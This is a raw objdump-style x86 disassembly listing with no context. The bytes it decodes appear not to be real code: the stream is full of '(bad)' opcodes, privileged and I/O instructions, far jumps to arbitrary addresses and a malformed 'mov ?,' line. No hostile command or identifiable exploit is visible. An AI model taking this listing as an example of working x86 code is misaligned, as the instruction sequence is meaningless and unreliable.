  408fd7:	cmp    eax,0x6bf7b974
  408fdc:	lea    edi,[ebx+0x22f08fed]
  408fe2:	outs   dx,DWORD PTR ds:[esi]
  408fe3:	in     al,0xec
  408fe5:	adc    eax,0x1f2b5257
  408fea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408feb:	push   0xb0b55a29
  408ff0:	(bad)  
  408ff1:	aas    
  408ff2:	adc    eax,0x68f0e06a
  408ff7:	(bad)  
  408ff8:	(bad)  
  408ff9:	in     al,0xde
  408ffb:	mov    al,0x76
  408ffd:	xchg   esp,eax
  408ffe:	into   
  408fff:	scas   al,BYTE PTR es:[edi]
  409000:	cmp    bh,BYTE PTR [ebx-0x11]
  409003:	popa   
  409004:	adc    bl,al
  409006:	arpl   dx,dx
  409008:	add    BYTE PTR [eax+0xd],ch
  40900b:	mov    edi,0x19331363
  409010:	imul   DWORD PTR [esi-0x9]
  409013:	cmp    bh,bl
  409015:	std    
  409016:	rol    DWORD PTR [esi+0x26],1
  409019:	cli    
  40901a:	push   edx
  40901b:	mov    esp,0x529c433c
  409020:	shr    DWORD PTR [edx-0x3c],1
  409023:	cmp    eax,0x29ef169e
  409028:	fist   WORD PTR [eax+0xf7179b4]
  40902e:	jnp    0x40908e
  409030:	xor    al,0x8b
  409032:	mov    ch,0x62
  409034:	sub    DWORD PTR [eax+ebx*1+0xb],edx
  409038:	cdq    
  409039:	cmp    al,0xfe
  40903b:	mov    ds:0x5e1d6f6a,al
  409040:	mov    BYTE PTR [eax],cl
  409042:	adc    bh,bl
  409044:	jno    0x40907d
  409046:	lea    esp,[ecx]
  409048:	(bad)  
  409049:	mov    bh,0x50
  40904b:	inc    ecx
  40904c:	mov    WORD PTR [edi-0x7e],es
  40904f:	adc    al,0x76
  409051:	mov    dh,bh
  409053:	je     0x40904c
  409055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409056:	pop    esp
  409057:	rcl    BYTE PTR [edi+0x4f298d17],0x68
  40905e:	or     BYTE PTR [ebx],cl
  409060:	loop   0x40905b
  409062:	xchg   edx,eax
  409063:	or     BYTE PTR [edi],0x4b
  409066:	(bad)  
  409067:	shl    DWORD PTR [ecx+0x76c1528b],0x74
  40906e:	(bad)  
  40906f:	lds    eax,FWORD PTR [edi-0x1fe902f7]
  409075:	aaa    
  409076:	jo     0x4090e5
  409078:	pop    edi
  409079:	enter  0xd5ab,0x70
  40907d:	fadd   st(4),st
  40907f:	xor    eax,0x7d52cd00
  409084:	outs   dx,DWORD PTR ds:[esi]
  409085:	sbb    BYTE PTR [ebx],0x54
  409088:	aam    0xe7
  40908a:	(bad)  
  40908b:	mov    eax,ds:0x8f0d9d38
  409090:	mov    ds:0xdb6e952a,al
  409095:	fild   QWORD PTR [esi+0x19cc896d]
  40909b:	pusha  
  40909c:	push   cs
  40909d:	stos   DWORD PTR es:[edi],eax
  40909e:	mov    dl,0x27
  4090a0:	or     cl,ah
  4090a2:	pop    esi
  4090a3:	mul    bl
  4090a5:	mov    bh,0x8b
  4090a7:	jo     0x4090c1
  4090a9:	mov    esp,0x3e83a91f
  4090ae:	fs jo  0x40909b
  4090b1:	jmp    0xa20c834b
  4090b6:	shl    esi,1
  4090b8:	ficom  WORD PTR [ebp-0x43]
  4090bb:	mov    DWORD PTR [esi-0x50],ecx
  4090be:	cwde   
  4090bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090c0:	ror    BYTE PTR [ebx],1
  4090c2:	xchg   DWORD PTR [ecx+0x7d3bde54],edi
  4090c8:	das    
  4090c9:	(bad)  
  4090ca:	enter  0xc52b,0x8
  4090ce:	sbb    BYTE PTR [ecx+0x57267ced],bh
  4090d4:	pushf  
  4090d5:	jle    0x409129
  4090d7:	adc    eax,0x5279d8cb
  4090dc:	sar    DWORD PTR [edx-0x70],1
  4090df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090e0:	and    DWORD PTR [ebp-0x7c],ebp
  4090e3:	dec    eax
  4090e4:	jno    0x40908c
  4090e6:	mov    ds:0x291e0962,eax
  4090eb:	lahf   
  4090ec:	sti    
  4090ed:	pop    ds
  4090ee:	xchg   edx,eax
  4090ef:	(bad)  
  4090f0:	int3   
  4090f1:	bound  ebx,QWORD PTR [ebp+0x35]
  4090f4:	add    cl,ch
  4090f6:	js     0x40908a
  4090f8:	push   es
  4090f9:	cwde   
  4090fa:	ja     0x409146
  4090fc:	mov    fs,edi
  4090fe:	dec    esi
  4090ff:	ins    BYTE PTR es:[edi],dx
  409100:	mov    esp,0x36baf1a2
  409105:	sbb    bl,BYTE PTR [eax+ebx*1-0x77]
  409109:	lahf   
  40910a:	stos   BYTE PTR es:[edi],al
  40910b:	test   al,0xaa
  40910d:	mov    BYTE PTR [esi+esi*2-0x710c61b2],al
  409114:	xor    DWORD PTR [esp+eax*2-0x1fa6307e],esp
  40911b:	data16 (bad) 
  40911e:	mov    ebx,0x6417e086
  409123:	pushf  
  409124:	mov    edx,0x315545ed
  40912a:	xor    bh,BYTE PTR [edx-0x42]
  40912d:	or     DWORD PTR [edi-0x45c1bcb7],ebx
  409133:	pop    ecx
  409134:	mov    cx,ds
  409137:	cdq    
  409138:	lea    edi,[ebx+0x7f]
  40913b:	call   0xb630:0x66ee1a4e
  409142:	push   esp
  409143:	lds    edi,FWORD PTR [ecx-0x51]
  409146:	mov    ch,0x66
  409148:	mov    ds:0x27643717,eax
  40914d:	cli    
  40914e:	and    al,0x99
  409150:	ds iret 
  409152:	pop    ecx
  409153:	das    
  409154:	push   edx
  409155:	repz and esp,0x27
  409159:	retf   
  40915a:	mov    al,ds:0xc37c4a9a
  40915f:	or     esp,ebx
  409161:	cli    
  409162:	xor    bh,dl
  409164:	jmp    0xcf81:0xd8b353e9
  40916b:	aad    0xfd
  40916d:	push   esi
  40916e:	rol    DWORD PTR [esi-0x4bb74a0c],1
  409174:	sub    BYTE PTR [esi],0x46
  409177:	push   edx
  409178:	(bad)  
  409179:	cmp    ch,BYTE PTR [edi+esi*1-0x37]
  40917d:	push   ebx
  40917e:	neg    BYTE PTR [edi+0x6c]
  409181:	xadd   edx,esp
  409184:	push   ds
  409185:	push   esp
  409186:	or     dl,BYTE PTR [esi]
  409188:	add    DWORD PTR [ecx],ebx
  40918a:	scas   al,BYTE PTR es:[edi]
  40918b:	(bad)  
  40918c:	mov    ebx,0x17e59611
  409191:	mov    eax,ds:0xea13cffc
  409196:	or     bl,ah
  409198:	adc    al,0x7e
  40919a:	and    bh,BYTE PTR [ebx+0x7a]
  40919d:	dec    DWORD PTR [edx]
  40919f:	arpl   ax,ax
  4091a1:	xor    BYTE PTR [esi+0x4600e3d],al
  4091a7:	adc    eax,0x90056681
  4091ac:	mov    eax,ds:0x1ec863c9
  4091b1:	(bad)  
  4091b2:	daa    
  4091b3:	push   ecx
  4091b4:	loopne 0x409222
  4091b6:	scas   eax,DWORD PTR es:[edi]
  4091b7:	push   ebp
  4091b8:	into   
  4091b9:	cmp    BYTE PTR [esi-0x57],cl
  4091bc:	imul   esi,DWORD PTR [edx],0xba1e574d
  4091c2:	test   BYTE PTR [edi],0x4e
  4091c5:	xchg   ebp,eax
  4091c6:	lds    ecx,FWORD PTR [ebx]
  4091c8:	mov    ebp,DWORD PTR [esp+ecx*8+0x1b]
  4091cc:	clc    
  4091cd:	or     al,BYTE PTR [eax+0x5e7c64b]
  4091d3:	sbb    ebp,DWORD PTR [ecx+ebp*1-0x2]
  4091d7:	mov    eax,0xf5334c0b
  4091dc:	xor    al,0xa1
  4091de:	enter  0x940e,0x74
  4091e2:	(bad)  
  4091e4:	(bad)  
  4091e5:	ins    DWORD PTR es:[edi],dx
  4091e6:	add    eax,0xfe20bbfc
  4091eb:	mov    eax,DWORD PTR [edi]
  4091ed:	es inc esp
  4091ef:	adc    BYTE PTR [eax-0x48],cl
  4091f2:	je     0x4091dc
  4091f4:	in     al,0x5a
  4091f6:	frstpm(287 only) 
  4091f8:	fwait
  4091f9:	aad    0x43
  4091fb:	jecxz  0x40924e
  4091fd:	jno    0x409265
  4091ff:	rcr    BYTE PTR [ecx-0x35d70d1d],cl
  409205:	fdiv   QWORD PTR [ebx-0x22]
  409208:	sbb    esp,DWORD PTR [edx-0xab08f11]
  40920e:	add    DWORD PTR [edx-0x1e294eab],ecx
  409214:	scas   eax,DWORD PTR es:[edi]
  409215:	test   DWORD PTR [eax-0x4e],eax
  409218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409219:	mov    ebp,0x5b55f013
  40921e:	push   edx
  40921f:	fsub   st(0),st
  409221:	das    
  409222:	mov    ch,0xfa
  409224:	(bad)  
  409225:	mov    esp,0x493af569
  40922a:	jno    0x4091b1
  40922c:	mov    ds:0xa48e9a30,al
  409231:	in     al,dx
  409232:	cmp    eax,0x9a5a2422
  409237:	lea    edx,ds:0x2283a84d
  40923d:	push   ebx
  40923e:	out    0x7,eax
  409240:	adc    eax,0x22930d3f
  409245:	ret    0x4387
  409248:	inc    ebp
  409249:	arpl   WORD PTR [ebx+0x32],dx
  40924c:	lock aas 
  40924e:	stc    
  40924f:	jae    0x40921b
  409251:	jecxz  0x409238
  409253:	push   esi
  409254:	shl    cl,cl
  409256:	ss pop eax
  409258:	inc    edx
  409259:	(bad)  
  40925a:	(bad)
  40925d:	loopne 0x40920d
  40925f:	inc    ebx
  409260:	adc    DWORD PTR [esi+0x2],ecx
  409263:	jecxz  0x40929b
  409265:	cmp    al,0x9d
  409267:	xor    esp,DWORD PTR [esi]
  409269:	xchg   edi,eax
  40926a:	mov    edx,0xec7ea263
  40926f:	mov    dh,0xc9
  409271:	mov    ebx,0xc3ca42eb
  409276:	repz hlt 
  409278:	sbb    al,0x98
  40927a:	dec    esp
  40927b:	adc    esi,DWORD PTR [ecx+edx*4+0xc]
  40927f:	lods   eax,DWORD PTR ds:[esi]
  409280:	xchg   BYTE PTR [ecx],al
  409282:	int3   
  409283:	mov    bh,0x5b
  409285:	inc    ebx
  409286:	shr    DWORD PTR [esi-0x212691a9],1
  40928c:	xor    eax,0x290d4ad6
  409291:	lods   al,BYTE PTR ds:[esi]
  409292:	in     al,0x64
  409294:	add    DWORD PTR [ebp+0xc516c00],eax
  40929a:	jae    0x409284
  40929c:	xchg   esi,eax
  40929d:	into   
  40929e:	mov    esp,0xfd18b191
  4092a3:	dec    eax
  4092a4:	jbe    0x4092b5
  4092a6:	inc    esi
  4092a7:	sub    ah,ch
  4092a9:	mov    WORD PTR [esi+0x3e6e5f91],ss
  4092af:	cdq    
  4092b0:	jb     0x4092cf
  4092b2:	sub    ah,BYTE PTR [esi]
  4092b4:	mov    eax,ds:0x41ad688c
  4092b9:	imul   ecx,esi,0xdaee3577
  4092bf:	repnz rol dl,0x21
  4092c3:	clc    
  4092c4:	push   edi
  4092c5:	mov    al,0x21
  4092c7:	cwde   
  4092c8:	nop
  4092c9:	hlt    
  4092ca:	mov    ds:0xd340422e,al
  4092cf:	push   esi
  4092d0:	inc    esp
  4092d1:	cdq    
  4092d2:	push   ds
  4092d3:	mov    esp,0x12f48d49
  4092d8:	lock rcr ebp,1
  4092db:	add    BYTE PTR [edi-0xb20573b],dl
  4092e1:	push   0xd3c27357
  4092e6:	js     0x409285
  4092e8:	sub    eax,0xb70a0ec0
  4092ed:	cmp    al,0x92
  4092ef:	stos   DWORD PTR es:[edi],eax
  4092f0:	lds    eax,FWORD PTR [edx+eiz*1-0x56]
  4092f4:	mov    eax,0x31084fc9
  4092f9:	rcr    edi,cl
  4092fb:	jnp    0x4092bc
  4092fd:	inc    ebp
  4092fe:	loop   0x409359
  409300:	lahf   
  409301:	sbb    eax,0xd79cfe42
  409306:	adc    esi,ecx
  409308:	fmul   DWORD PTR [ecx]
  40930a:	pop    es
  40930b:	push   es
  40930c:	jns    0x409305
  40930e:	push   ds
  40930f:	cmp    al,0x91
  409311:	mov    dh,0xd3
  409313:	jle    0x4092fb
  409315:	into   
  409316:	mov    BYTE PTR [ebx+0x778c196a],dl
  40931c:	data16 int3 
  40931e:	clc    
  40931f:	xchg   BYTE PTR [edi-0x6a],bh
  409322:	push   ebp
  409323:	jmp    0x3aae:0x3b6c183a
  40932a:	nop
  40932b:	cmp    eax,0x3a8bbfc5
  409330:	repnz stos DWORD PTR es:[edi],eax
  409332:	adc    BYTE PTR [ebx],0xe6
  409335:	cmp    ebp,ebx
  409337:	das    
  409338:	frstor [ebp+0x2132926]
  40933e:	loope  0x409352
  409340:	xor    eax,edi
  409342:	push   esi
  409343:	test   al,0xa7
  409345:	or     eax,0x3885ee07
  40934a:	(bad)  
  40934c:	nop
  40934d:	dec    ecx
  40934e:	mov    dl,0x8b
  409350:	sbb    BYTE PTR [edx+0x3d],ch
  409353:	aaa    
  409354:	mov    bh,0xa4
  409356:	xchg   esp,eax
  409357:	hlt    
  409358:	(bad)  
  409359:	enter  0x8169,0x4a
  40935d:	repz fsub QWORD PTR [bp-0x46]
  409362:	xor    bl,BYTE PTR [eax-0x75]
  409365:	mov    cl,0x6
  409367:	ins    DWORD PTR es:[edi],dx
  409368:	ins    DWORD PTR es:[edi],dx
  409369:	out    0x43,al
  40936b:	mov    cl,BYTE PTR [ebx+0x3a4b0693]
  409371:	mov    eax,0x2fe4341e
  409376:	inc    edi
  409377:	cdq    
  409378:	push   edx
  409379:	pushf  
  40937a:	dec    ebx
  40937b:	idiv   DWORD PTR [ebx-0x5d128926]
  409381:	sub    edx,edi
  409383:	push   es
  409384:	jl     0x4093e4
  409386:	stos   DWORD PTR es:[edi],eax
  409387:	pusha  
  409388:	test   DWORD PTR [edi+0x380947ed],ebx
  40938e:	xor    eax,0xbcc6176f
  409393:	aaa    
  409394:	dec    edx
  409395:	bound  ecx,QWORD PTR ss:[ecx+esi*2+0x2849c84c]
  40939d:	push   edx
  40939e:	sub    DWORD PTR [eax+0x6a],edi
  4093a1:	mov    ecx,DWORD PTR [ebp-0x47a266e4]
  4093a7:	std    
  4093a8:	xchg   edi,eax
  4093a9:	loopne 0x4093dc
  4093ab:	inc    ecx
  4093ac:	mov    dl,BYTE PTR [edx]
  4093ae:	inc    edx
  4093af:	mov    eax,ds:0xe807fc8d
  4093b4:	mov    eax,ds:0xaf763768
  4093b9:	push   edx
  4093ba:	sbb    cl,ah
  4093bc:	nop
  4093bd:	xor    edi,DWORD PTR [ebx+eax*1+0x2426316f]
  4093c4:	inc    ebx
  4093c5:	jns    0x40934a
  4093c7:	mov    esp,0xf73a69c9
  4093cc:	lea    ebp,[esi]
  4093ce:	push   cs
  4093cf:	xchg   esp,eax
  4093d0:	inc    esp
  4093d1:	xor    DWORD PTR [ebp+0x7a8034cf],0xda06127d
  4093db:	mov    edx,0xee9e2088
  4093e0:	fnstcw WORD PTR [edx+0x5b]
  4093e3:	or     cl,BYTE PTR [edi+0x3a]
  4093e6:	fcom   DWORD PTR [edx]
  4093e8:	fidiv  DWORD PTR [edx+0x75865066]
  4093ee:	retf   0x1d05
  4093f1:	cs in  al,dx
  4093f3:	je     0x4093da
  4093f5:	cli    
  4093f6:	jno    0x409477
  4093f8:	adc    bh,dl
  4093fa:	adc    edi,DWORD PTR [edx+edi*1]
  4093fd:	xchg   ebp,eax
  4093fe:	sub    al,0x49
  409400:	xchg   DWORD PTR [edx-0x78],edi
  409403:	dec    ecx
  409404:	ror    ch,0x2f
  409407:	stc    
  409408:	lds    ecx,FWORD PTR [edx+ebp*1-0xb]
  40940c:	repnz inc ecx
  40940e:	ficomp DWORD PTR [eax+edx*1+0x29]
  409412:	test   ecx,ecx
  409414:	xchg   ebx,eax
  409415:	sbb    BYTE PTR ds:0x62b2fdc,al
  40941b:	cdq    
  40941c:	jg     0x409484
  40941e:	inc    edi
  40941f:	sub    eax,esp
  409421:	shl    DWORD PTR [edi],1
  409423:	jne    0x409417
  409425:	cwde   
  409426:	cmp    DWORD PTR [esi],ebp
  409428:	xchg   BYTE PTR [ebp-0x4262081a],dl
  40942e:	mov    eax,DWORD PTR [ebp-0x189fbb0b]
  409434:	adc    DWORD PTR [eax-0x4a],esp
  409437:	xchg   edx,eax
  409438:	xchg   ebx,eax
  409439:	test   al,0xc1
  40943b:	mov    BYTE PTR [ebp+0x66686394],bh
  409441:	pop    ebx
  409442:	xor    edi,DWORD PTR [di+0x5f]
  409446:	cld    
  409447:	cli    
  409448:	add    DWORD PTR [eax+0x47],edx
  40944b:	sub    esi,DWORD PTR [edi+0x4c9b8283]
  409451:	xchg   edi,eax
  409452:	and    BYTE PTR [ebp+esi*2-0x62e90eea],bl
  409459:	popf   
  40945a:	mov    eax,ds:0xf246e43
  40945f:	cmp    DWORD PTR [eax],esp
  409461:	or     DWORD PTR [edi-0x70509f75],eax
  409467:	xchg   ebp,eax
  409468:	mov    al,ds:0xb4baffa8
  40946d:	leave  
  40946e:	jnp    0x4093fa
  409470:	(bad)  
  409471:	mov    ch,0xdd
  409473:	leave  
  409474:	ror    BYTE PTR [eax],1
  409476:	icebp  
  409477:	fdiv   QWORD PTR [ebx]
  409479:	icebp  
  40947a:	repz mov ah,BYTE PTR [edx]
  40947d:	jle    0x40947c
  40947f:	sbb    ah,BYTE PTR [eax+0x67ccedd9]
  409485:	add    BYTE PTR [ebx+ebx*8+0xb],cl
  409489:	mov    dl,0x69
  40948b:	jo     0x40948e
  40948d:	out    0x23,eax
  40948f:	inc    edx
  409490:	cli    
  409491:	test   al,0x33
  409493:	loop   0x4094a9
  409495:	xor    BYTE PTR [ebp+edi*2+0x1a],ah
  409499:	mov    ch,0xb6
  40949b:	int3   
  40949c:	cld    
  40949d:	adc    al,0x42
  40949f:	(bad)  
  4094a0:	xor    cl,BYTE PTR [edi*1-0x3662057f]
  4094a7:	push   ebx
  4094a8:	adc    eax,0xff84420b
  4094ad:	jns    0x4094b3
  4094af:	pop    eax
  4094b0:	fistp  QWORD PTR [esi+0x3766b4da]
  4094b6:	lods   eax,DWORD PTR ds:[esi]
  4094b7:	jl     0x4094f0
  4094b9:	cmp    dh,bl
  4094bb:	mov    esi,0x1273cf1b
  4094c0:	and    esp,ecx
  4094c2:	sub    al,0x79
  4094c4:	jo     0x4094bc
  4094c6:	xchg   ecx,eax
  4094c7:	dec    edx
  4094c8:	mov    dh,0x9a
  4094ca:	std    
  4094cb:	sub    al,0x1a
  4094cd:	inc    esp
  4094ce:	shl    BYTE PTR ds:0xf5239d33,cl
  4094d4:	mov    dh,0x78
  4094d6:	sbb    DWORD PTR [eax-0x80],ebp
  4094d9:	dec    ecx
  4094da:	xor    al,0xbd
  4094dc:	or     dl,dh
  4094de:	ror    DWORD PTR [ebx],cl
  4094e0:	scas   al,BYTE PTR es:[edi]
  4094e1:	mov    eax,0x9feb3ff7
  4094e6:	outs   dx,BYTE PTR ds:[esi]
  4094e7:	add    dl,BYTE PTR [ebx-0x40]
  4094ea:	add    DWORD PTR ds:0xeb2ffb5f,ebp
  4094f0:	cmp    dl,cl
  4094f2:	gs pop eax
  4094f4:	pusha  
  4094f5:	out    0xa3,al
  4094f7:	dec    eax
  4094f8:	jo     0x4094b3
  4094fa:	pop    ss
  4094fb:	loope  0x409579
  4094fd:	imul   BYTE PTR [eax+0x59e7aed]
  409503:	xlat   BYTE PTR ds:[ebx]
  409504:	mov    ebx,0x56984181
  409509:	inc    edx
  40950a:	sbb    DWORD PTR ds:0x9fa53b1d,eax
  409510:	xchg   edi,eax
  409511:	or     al,0xf7
  409513:	sar    BYTE PTR [ecx],1
  409515:	lods   eax,DWORD PTR ds:[esi]
  409516:	add    BYTE PTR [eax+0x1c],al
  409519:	xchg   BYTE PTR [esi+0x64e3168c],al
  40951f:	stos   BYTE PTR es:[edi],al
  409520:	stos   DWORD PTR es:[edi],eax
  409521:	push   cs
  409522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409523:	mov    bh,0xe1
  409525:	bswap  ebp
  409527:	leave  
  409528:	mov    es,WORD PTR [ebp+0x5a82ff56]
  40952e:	mov    eax,ds:0x60d7d0a1
  409533:	mov    edi,DWORD PTR [edi-0x54]
  409536:	sub    BYTE PTR [eax],bh
  409538:	adc    edx,edi
  40953a:	imul   esp,DWORD PTR [ecx],0xffffffb8
  40953d:	rcr    BYTE PTR [ebx],1
  40953f:	sahf   
  409540:	aam    0x15
  409542:	mov    esi,eax
  409544:	aaa    
  409545:	test   DWORD PTR [ebx],eax
  409547:	jg     0x409597
  409549:	fnstcw WORD PTR [ebx]
  40954b:	xchg   ebp,eax
  40954c:	call   0x52cdbb54
  409551:	data16 and BYTE PTR [ebp-0x21],ch
  409555:	stc    
  409556:	retf   0xe9d8
  409559:	pop    eax
  40955a:	hlt    
  40955b:	pop    edx
  40955c:	mov    edx,0x4bc2f9f1
  409561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409562:	inc    esi
  409563:	(bad)  
  409564:	or     eax,0xe29e41d9
  409569:	dec    esp
  40956a:	jle    0x40955c
  40956c:	xchg   ecx,eax
  40956d:	je     0x4095b3
  40956f:	(bad)  [edx+0x11]
  409572:	mov    eax,ds:0x7d2c1f3d
  409577:	fs push ss
  409579:	cld    
  40957a:	sub    eax,0x4d7bfdcb
  40957f:	dec    esi
  409580:	push   ebp
  409581:	push   ebp
  409582:	xchg   BYTE PTR [ebx+0x730c772],bh
  409588:	in     eax,dx
  409589:	idiv   BYTE PTR [ebp+0x6e]
  40958c:	jbe    0x4095d8
  40958e:	jae    0x4095d1
  409590:	out    0xcd,al
  409592:	adc    eax,0x73f0432c
  409597:	mov    eax,ss:0xfe076dab
  40959d:	sub    DWORD PTR [ebp+0xc2ade8],0x532aa41b
  4095a7:	inc    ecx
  4095a8:	(bad)  
  4095a9:	stc    
  4095aa:	daa    
  4095ab:	test   BYTE PTR [edi+0x6a7542],dh
  4095b1:	sub    edi,ecx
  4095b3:	pop    ecx
  4095b4:	or     edi,DWORD PTR [eax+0x1b]
  4095b7:	leave  
  4095b8:	add    ecx,DWORD PTR [edi]
  4095ba:	cmp    eax,eax
  4095bc:	xchg   ebx,eax
  4095bd:	push   edx
  4095be:	jge    0x409584
  4095c0:	xor    al,0xbd
  4095c2:	or     esp,DWORD PTR [edx+ebp*1]
  4095c5:	cdq    
  4095c6:	cmp    ebx,esi
  4095c8:	jl     0x40961b
  4095ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095cb:	sbb    BYTE PTR [edi],0xc8
  4095ce:	pop    edx
  4095cf:	or     DWORD PTR ds:0xf847bf40,eax
  4095d5:	and    eax,0x602ed6dd
  4095da:	or     eax,0xfcba9410
  4095df:	and    BYTE PTR [ecx-0x76b35959],ch
  4095e5:	jle    0x4095f8
  4095e7:	int    0xea
  4095e9:	retf   0x5a78
  4095ec:	imul   esi,ebx,0xffffffc4
  4095ef:	dec    esp
  4095f0:	jl     0x4095da
  4095f2:	push   edx
  4095f3:	mov    cl,0x48
  4095f5:	or     BYTE PTR [edi+0x1e],dl
  4095f8:	pop    ebp
  4095f9:	bound  esi,QWORD PTR [edi]
  4095fb:	sbb    BYTE PTR [edi-0xeff914e],al
  409601:	jge    0x4095ee
  409603:	fmul   DWORD PTR [edi-0x22]
  409606:	add    DWORD PTR [edx+0x173a1811],eax
  40960c:	retf   
  40960d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40960e:	enter  0x511a,0xcd
  409612:	mov    dl,0x81
  409614:	mov    esi,0xc1a615e
  409619:	test   al,0x79
  40961b:	jno    0x409663
  40961d:	sar    DWORD PTR [eax-0x39845254],1
  409623:	mov    bl,0x4f
  409625:	xchg   edx,eax
  409626:	xchg   ecx,eax
  409627:	outs   dx,DWORD PTR ds:[esi]
  409628:	shl    dh,1
  40962a:	or     eax,0x23b80d10
  40962f:	call   0x32634651
  409634:	mov    BYTE PTR [esi],dh
  409636:	sub    BYTE PTR ds:0x7f716100,0xf8
  40963d:	push   es
  40963e:	mov    ch,0x2d
  409640:	stos   DWORD PTR es:[edi],eax
  409641:	jne    0x409622
  409643:	ja     0x40962d
  409645:	lods   eax,DWORD PTR ds:[esi]
  409646:	mov    dh,0x1d
  409648:	pop    edi
  409649:	inc    ecx
  40964a:	xchg   esp,eax
  40964b:	sbb    edx,DWORD PTR [esi+esi*2-0x63]
  40964f:	in     eax,0x5
  409651:	psrld  mm1,mm5
  409654:	cld    
  409655:	ins    BYTE PTR es:[edi],dx
  409656:	jmp    0x409609
  409658:	inc    ebp
  409659:	adc    al,0x85
  40965b:	iret   
  40965c:	and    al,0xb3
  40965e:	mov    cl,BYTE PTR [edx]
  409660:	mov    edx,0x8b8689c3
  409665:	mov    ds:0x9962262c,al
  40966a:	pop    ebx
  40966b:	outs   dx,BYTE PTR ds:[esi]
  40966c:	mov    BYTE PTR [edi+0x518c4649],ah
  409672:	ds cmp ch,bl
  409675:	fidiv  DWORD PTR [esi]
  409677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409678:	cmp    BYTE PTR [esi-0x71],bl
  40967b:	cmp    al,0x56
  40967d:	sbb    al,0x8c
  40967f:	ins    DWORD PTR es:[di],dx
  409681:	push   edi
  409682:	lods   al,BYTE PTR ds:[esi]
  409683:	and    DWORD PTR [ebp+0x39af105c],ebp
  409689:	push   ecx
  40968a:	fsub   st,st(3)
  40968c:	dec    esp
  40968d:	stc    
  40968e:	mov    ah,0x13
  409690:	or     DWORD PTR [esi+edx*1+0x198378ae],ebx
  409697:	jbe    0x4096fa
  409699:	cs mov ebp,0xf6c98e03
  40969f:	inc    ecx
  4096a0:	fsub   st(6),st
  4096a2:	fbstp  TBYTE PTR [eax+0x36c7c352]
  4096a8:	adc    eax,0x32ddd187
  4096ad:	or     eax,0xc9f153f6
  4096b2:	jecxz  0x409725
  4096b4:	mov    edx,0x4759f126
  4096b9:	mov    WORD PTR ds:0x4098f2d8,es
  4096bf:	jno    0x409723
  4096c1:	call   0x49504a63
  4096c6:	inc    edi
  4096c7:	dec    ebp
  4096c8:	xor    dh,bl
  4096ca:	mov    ?,WORD PTR [edx]
  4096cc:	sub    al,0xb1
  4096ce:	sub    DWORD PTR ds:0x1cbf57eb,ebx
  4096d4:	dec    ebp
  4096d5:	jns    0x40971c
  4096d7:	into   
  4096d8:	mov    bl,0xd2
  4096da:	js     0x4096f9
  4096dc:	fs sbb al,0xcd
  4096df:	inc    esp
  4096e0:	out    0x53,al
  4096e2:	sub    cl,BYTE PTR [eax-0x6e]
  4096e5:	cmp    al,0xc7
  4096e7:	dec    esi
  4096e8:	popf   
  4096e9:	loopne 0x409706
  4096eb:	(bad)  
  4096ec:	mov    cl,BYTE PTR [edi]
  4096ee:	repnz addr16 mov cl,0xe6
  4096f2:	ficom  DWORD PTR [ebp+0xc]
  4096f5:	cld    
  4096f6:	leave  
  4096f7:	inc    esi
  4096f9:	loope  0x40973f
  4096fb:	and    eax,0xcd13437d
  409700:	cmc    
  409701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409702:	test   eax,0x4eed29ae
  409707:	xchg   esp,eax
  409708:	jnp    0x409728
  40970a:	in     eax,0x63
  40970c:	and    al,BYTE PTR [ebx]
  40970e:	imul   eax,DWORD PTR [ecx],0xcb231317
  409714:	fwait
  409715:	lods   al,BYTE PTR ds:[esi]
  409716:	mov    dl,0x87
  409718:	sahf   
  409719:	inc    edi
  40971a:	pop    ds
  40971b:	and    bl,BYTE PTR [edx]
  40971d:	call   0x3eb1:0xbe2d577a
  409724:	ins    BYTE PTR es:[edi],dx
  409725:	xor    BYTE PTR [ecx-0x5f34d0fc],ah
  40972b:	and    DWORD PTR [eax-0x6712d009],0x6c
  409732:	fwait
  409733:	mov    cl,0xf4
  409735:	add    ecx,edx
  409737:	push   cs
  409738:	adc    dl,BYTE PTR [edi-0x6e0bfef5]
  40973e:	jbe    0x40973b
  409740:	outs   dx,BYTE PTR ds:[esi]
  409741:	push   edx
  409742:	sub    DWORD PTR [edi],0x42
  409745:	loop   0x4097bd
  409747:	jae    0x4096ef
  409749:	popa   
  40974a:	mov    ah,0x4e
  40974c:	or     bh,BYTE PTR [ebp+0xb]
  40974f:	or     ebp,edx
  409751:	mov    dh,0x31
  409753:	ret    0x3f98
  409756:	mov    ebp,0x97ac6a1a
  40975b:	aam    0x2f
  40975d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40975e:	aas    
  40975f:	xchg   edi,eax
  409760:	pop    ebp
  409761:	xor    DWORD PTR [esp+eiz*8-0x75115f27],esi
  409768:	das    
  409769:	mov    edi,0x5664bfa7
  40976e:	add    eax,0x3a2ada6f
  409773:	sbb    edi,esi
  409775:	xchg   DWORD PTR [ebx-0x56],ebp
  409778:	pop    esi
  409779:	xor    al,0x88
  40977b:	rcr    BYTE PTR [edx-0x6d43b941],1
  409781:	test   BYTE PTR [edi+eax*1],al
  409784:	jb     0x40979f
  409786:	xor    esi,DWORD PTR [edx-0x166b5318]
  40978c:	mov    ss,WORD PTR [eax-0x3b09de65]
  409792:	loope  0x409725
  409794:	retf   
  409795:	in     al,dx
  409796:	mov    ds:0xa7fc66ff,al
  40979b:	cmp    BYTE PTR [ecx-0x4],bh
  40979e:	mov    al,0x7d
  4097a0:	sub    eax,0x73709ade
  4097a5:	mov    BYTE PTR [edx],bl
  4097a7:	mov    dl,0x6e
  4097a9:	aas    
  4097aa:	lock in eax,0xdd
  4097ad:	and    eax,0x2f2a061f
  4097b2:	rcr    BYTE PTR [edx],cl
  4097b4:	dec    ebx
  4097b5:	sti    
  4097b6:	mov    WORD PTR [eax+0x6710ab98],cs
  4097bc:	aad    0x6c
  4097be:	adc    ebx,edx
  4097c0:	rol    BYTE PTR [ebx+eiz*8],1
  4097c3:	inc    edx
  4097c4:	xor    DWORD PTR [edi-0xdfaab64],0xffffffae
